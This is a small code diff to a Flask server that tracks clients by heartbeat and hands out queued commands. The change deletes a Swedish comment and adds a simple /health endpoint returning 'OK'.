@@ -26,7 +26,6 @@ def heartbeat():
 @app.route('/get-clients', methods=['GET'])
 def get_clients():
     now = time.time()
-    # Rensa bort clients som inte hörts av på HEARTBEAT_TIMEOUT sekunder
     active_clients = {cid: info for cid, info in clients.items() if now - info['last_seen'] < HEARTBEAT_TIMEOUT}
     return jsonify(active_clients)
 
@@ -44,6 +43,11 @@ def get_command():
     if client_id and client_id in commands:
         return commands[client_id]
     return ''
+
+# Här lägger vi till health endpoint
+@app.route('/health', methods=['GET'])
+def health():
+    return "OK", 200
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
